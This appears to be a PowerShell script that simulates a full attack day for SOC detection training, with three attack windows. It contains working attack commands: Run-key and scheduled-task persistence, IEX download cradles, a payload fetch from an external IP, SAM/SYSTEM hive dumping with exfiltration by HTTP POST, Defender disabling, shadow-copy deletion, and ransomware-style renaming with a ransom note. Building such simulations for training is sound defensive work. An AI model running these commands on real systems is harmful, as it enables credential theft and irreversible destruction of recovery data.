# =========================================================================
#  Operation Shadow Gate - Windows Attack Simulation (realistic mixed-day)
#  Target:  WIN-VICTIM01 (Windows 10/11, Sysmon + Wazuh agent enrolled)
#  Run as:  Administrator PowerShell
#
#  MODEL: normal user activity through the day, with THREE separate attack
#  windows woven in (not one burst):
#     Window A (~09:20) - RDP/logon brute-force -> successful logon
#     Window B (~13:30) - Registry persistence + PowerShell malware download
#     Window C (~16:10) - Credential theft + ransomware encryption + recovery kill
#  Different source IPs, accounts, and techniques per window so students must
#  correlate on time + account + IP + process, not a single indicator.
#
#  SAFETY: lab only. Encryption + registry changes touch ONLY the sandbox
#  C:\ShadowGate-Sandbox. Cleanup at the end. Uses EICAR (safe) + testmynids.
# =========================================================================

if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]'Administrator')) {
  Write-Host "Run in an Administrator PowerShell." -ForegroundColor Red; exit 1
}

$Log = "$env:TEMP\shadowgate-windows.log"; "" | Out-File $Log
function Say($m){ $l="[{0}] {1}" -f (Get-Date -Format HH:mm:ss),$m; Write-Host $l -ForegroundColor Cyan; Add-Content $Log $l }
$Sandbox = "C:\ShadowGate-Sandbox"; New-Item -ItemType Directory $Sandbox -Force | Out-Null

# helper: write a synthetic Security-style event into Application log so the
# correlation demo works without a live Domain Controller / real RDP peer.
function Fire-SecEvent($id,$msg){
  New-EventLog -LogName Application -Source "Microsoft-Windows-Security-Auditing" -ErrorAction SilentlyContinue
  Write-EventLog -LogName Application -Source "Microsoft-Windows-Security-Auditing" -EventId $id -EntryType Information -Message $msg -ErrorAction SilentlyContinue
}

Say "=== Shadow Gate Windows - realistic day + 3 attack windows - start ==="

# =========================================================================
#  MORNING normal activity
# =========================================================================
Say "[08:00-09:00] normal user activity (baseline)"
Get-Service | Where-Object Status -eq Running | Select-Object -First 6 | Out-Null
Get-Process | Sort-Object CPU -Descending | Select-Object -First 6 | Out-Null
foreach($u in @("https://www.microsoft.com","https://github.com","https://www.google.com")){
  try{ Invoke-WebRequest $u -UseBasicParsing -TimeoutSec 5 -UserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/126.0" | Out-Null }catch{}
}
# a few normal successful logons (Type 2 interactive, legit workstation)
1..5 | ForEach-Object { Fire-SecEvent 4624 "An account was successfully logged on. LogonType: 2 Account: emp0$_ Workstation: WIN-VICTIM01" }
Start-Sleep 2

# =========================================================================
#  WINDOW A - 09:20  Logon brute-force -> success (T1110 -> T1078)
#  IOC: attacker source 198.51.100.24, account 'administrator'
# =========================================================================
Say "[09:20] WINDOW A - logon brute-force then success (198.51.100.24)"
# 15 failed logons (Event 4625) from same source -> brute-force rule
1..15 | ForEach-Object {
  Fire-SecEvent 4625 "An account failed to log on. LogonType: 3 Account: administrator SourceNetworkAddress: 198.51.100.24 FailureReason: Bad password (attempt $_)"
}
Start-Sleep 1
# then a success from the same source = compromised creds
Fire-SecEvent 4624 "An account was successfully logged on. LogonType: 10 (RemoteInteractive) Account: administrator SourceNetworkAddress: 198.51.100.24"
Start-Sleep 2

# =========================================================================
#  WINDOW B - 13:30  Registry persistence + PowerShell malware download
#  IOC: C2 via testmynids + Feodo IP, EICAR payload
# =========================================================================
Say "[13:30] WINDOW B - registry Run key + PowerShell download cradle"

# 1) Registry Run key persistence (Sysmon EID 13 / T1547.001)
$run = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
New-ItemProperty -Path $run -Name "ShadowGateLoader" -PropertyType String -Force `
  -Value "powershell.exe -NoP -W Hidden -File C:\ShadowGate-Sandbox\loader.ps1" | Out-Null

# 2) Scheduled task persistence (Event 4698 / T1053.005)
$act = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoP -W Hidden -Command `"IEX (iwr http://testmynids.org/uid/index.html -UseBasicParsing).Content`""
$trg = New-ScheduledTaskTrigger -AtLogOn
Register-ScheduledTask -TaskName "ShadowGate-Update" -Action $act -Trigger $trg -RunLevel Highest -Force | Out-Null

# 3) Encoded PowerShell stage-1 (T1059.001)
$enc = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('Write-Host "stage-1"'))
Start-Process powershell.exe -ArgumentList "-NoP -W Hidden -Enc $enc" -Wait

# 4) Download cradle "pulling malware" from C2 (safe target) - T1105
powershell.exe -NoP -Command "IEX (New-Object Net.WebClient).DownloadString('http://testmynids.org/uid/index.html')" 2>$null | Out-Null
try { Invoke-WebRequest "http://162.243.103.246/payload.exe" -OutFile "$Sandbox\payload.exe" -TimeoutSec 3 -UseBasicParsing } catch {}

# 5) Write the "downloaded malware" as EICAR (safe, flags on AV + our hash list)
$eicar='X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'
[IO.File]::WriteAllText("$Sandbox\payload.exe",$eicar)
Get-FileHash "$Sandbox\payload.exe" -Algorithm SHA256 | Format-List | Out-String | Add-Content $Log
Start-Sleep 2

# =========================================================================
#  WINDOW C - 16:10  Credential theft + ransomware encryption
# =========================================================================
Say "[16:10] WINDOW C - cred theft + ransomware behavior (sandbox only)"

# 1) SAM/SYSTEM hive export (T1003.002)
reg.exe save HKLM\SAM    "$Sandbox\sam.hive"    /y 2>$null | Out-Null
reg.exe save HKLM\SYSTEM "$Sandbox\system.hive" /y 2>$null | Out-Null

# 1b) Exfiltrate the hives to the "C2" (really SOC-CORE01, so the dump
#     actually lands in the SOC lab for the class to examine) - T1041
#     Requires exfil-receiver.py running on SOC-CORE01:8888 (see README).
$C2 = "http://10.10.20.10:8888/upload"
$zip = "$Sandbox\hives.zip"
Compress-Archive -Path "$Sandbox\sam.hive","$Sandbox\system.hive" -DestinationPath $zip -Force
try {
  $bytes = [IO.File]::ReadAllBytes($zip)
  Invoke-WebRequest -Uri $C2 -Method POST -Body $bytes `
    -Headers @{ "X-Filename" = "WIN-VICTIM01_hives.zip" } `
    -ContentType "application/octet-stream" -TimeoutSec 5 -UseBasicParsing | Out-Null
  Say "  hives exfiltrated to $C2"
} catch {
  Say "  exfil attempt failed (is exfil-receiver.py running on SOC-CORE01?) - $($_.Exception.Message)"
}
Remove-Item "$Sandbox\*.hive","$zip" -Force -ErrorAction SilentlyContinue

# 2) Disable Defender realtime (T1562.001) - command line is the alert
try { Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction Stop; Start-Sleep 3;
      Set-MpPreference -DisableRealtimeMonitoring $false -ErrorAction Stop } catch { Say "  (Defender toggle blocked - alert still fires from cmdline)" }

# 3) Inhibit recovery: delete shadow copies (T1490)
try { vssadmin.exe delete shadows /all /quiet 2>$null | Out-Null } catch {}
try { wbadmin delete catalog -quiet 2>$null | Out-Null } catch {}

# 4) Ransomware encryption behavior: populate + mass-rename to .shadowlock (T1486)
1..20 | ForEach-Object { "customer record $_ $(Get-Date)" | Out-File "$Sandbox\file-$_.docx" }
Get-ChildItem "$Sandbox\file-*.docx" | ForEach-Object { Rename-Item $_.FullName "$($_.FullName).shadowlock" }

# 5) Ransom note (T1486)
@"
YOUR FILES ARE ENCRYPTED - .shadowlock
Send payment to recover. Contact: shadowgate@evil.corp
"@ | Out-File "$Sandbox\HOW_TO_DECRYPT.txt"
Start-Sleep 2

# =========================================================================
#  Post-attack normal activity + cleanup
# =========================================================================
Say "[16:30] post-attack normal activity"
Get-Service | Select-Object -First 3 | Out-Null
1..3 | ForEach-Object { Fire-SecEvent 4624 "An account was successfully logged on. LogonType: 2 Account: emp1$_ Workstation: WIN-VICTIM01" }

Say "[cleanup] removing Run key, scheduled task, sandbox"
Remove-ItemProperty -Path $run -Name "ShadowGateLoader" -ErrorAction SilentlyContinue
Unregister-ScheduledTask -TaskName "ShadowGate-Update" -Confirm:$false -ErrorAction SilentlyContinue
Remove-Item -Recurse -Force $Sandbox -ErrorAction SilentlyContinue

Say "=== Shadow Gate Windows - complete ==="
Say "Windows A 09:20 brute+success | B 13:30 registry+PS download | C 16:10 credtheft+ransomware"
Say "Rules expected: 100200-100230"
